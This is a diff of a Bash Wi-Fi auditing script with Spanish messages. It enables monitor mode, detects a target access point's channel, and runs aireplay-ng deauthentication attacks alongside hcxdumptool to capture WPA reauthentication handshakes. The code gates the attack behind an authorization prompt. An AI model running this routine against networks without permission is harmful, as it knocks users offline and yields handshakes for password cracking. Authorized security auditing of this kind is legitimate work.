@@ -97,16 +97,20 @@ analyze() {
     fi
 
     systemctl stop NetworkManager wpa_supplicant 2>/dev/null
+    ip link set $iface down
+    iw $iface set monitor control
+    ip link set $iface up 
     print_info "Interfaz $iface lista. Servicios detenidos."
 
     if $mode_normal; then
         print_info "Captura pasiva iniciada..."
         hcxdumptool -i "$iface" -w "$outfile" -F --rds=1
     else
+        # Modo deauth
         print_warning "AVISO ÉTICO:"
         echo "Has activado el modo -deauth. Este modo:"
         echo "  • Fuerza desautenticaciones sobre el AP autorizado ($ap_mac)"
-        echo "  • Lanza hcxdumptool y aireplay-ng en paralelo"
+        echo "  • Sincroniza canal entre hcxdumptool y aireplay-ng"
         echo ""
         read -p "¿Confirmas autorización por escrito? (yes/no): " confirm
         if [[ "$confirm" != "yes" ]]; then
@@ -115,42 +119,42 @@ analyze() {
             return
         fi
 
-        # Activar modo monitor
-        print_info "Activando modo monitor en $iface..."
-        #airmon-ng start "$iface" >/dev/null 2>&1
-        local iface_mon="${iface}"
-
-        # Confirmar interfaz monitor
-        if ! iwconfig "$iface_mon" &>/dev/null; then
-            print_error "Error al activar modo monitor en $iface."
+        # Detectar canal del AP objetivo
+        print_info "Detectando canal del AP $ap_mac..."
+        local channel=$(iw dev "$iface" scan 2>/dev/null | grep -A10 "$ap_mac" | grep "primary channel" | awk '{print $4}' | head -n1)
+        
+        if [[ -z "$channel" ]]; then
+            print_error "No se pudo detectar el canal del AP. Verifica que el AP esté al alcance."
             systemctl start NetworkManager wpa_supplicant 2>/dev/null
             return 1
         fi
-        print_success "Modo monitor activado: $iface_mon"
-
-        # Lanzar captura con hcxdumptool
-        print_info "Comenzando captura con hcxdumptool..."
-        hcxdumptool -i "$iface_mon" -w "$outfile" -F --rds=1 &
+        
+        print_success "Canal detectado: $channel (2.4GHz)"
+        
+        # Lanzar hcxdumptool fijado en ese canal
+        print_info "Iniciando captura en canal $channel..."
+        hcxdumptool -i "$iface" -w "$outfile" -c "${channel}a" --rds=1 &
         local pid_dump=$!
+        sleep 3  # Esperar a que hcxdumptool se estabilice
 
         # Lanzar aireplay-ng
         print_info "Desautenticando AP autorizado: $ap_mac..."
-        aireplay-ng -0 10 -a "$ap_mac" "$iface_mon" >/dev/null 2>&1 &
+        aireplay-ng -0 20 -a "$ap_mac" "$iface" >/dev/null 2>&1 &
         local pid_air=$!
 
-        print_info "Esperando a que las reautenticaciones se registren..."
-        sleep 20  # duración base de la desautenticación
+        print_info "Capturando reautenticaciones durante 30 segundos..."
+        sleep 30
 
         # Detener procesos
         kill $pid_air 2>/dev/null
         kill $pid_dump 2>/dev/null
+        wait $pid_dump 2>/dev/null
         print_success "Reautenticaciones capturadas."
-
-        # Desactivar monitor mode
-        print_info "Desactivando modo monitor..."
-        #airmon-ng stop "$iface_mon" >/dev/null 2>&1
     fi
 
+    ip link set $iface down
+    iw $iface set type managed
+    ip link set $iface up
     systemctl restart NetworkManager wpa_supplicant 2>/dev/null
     print_success "Servicios de red reactivados."
 
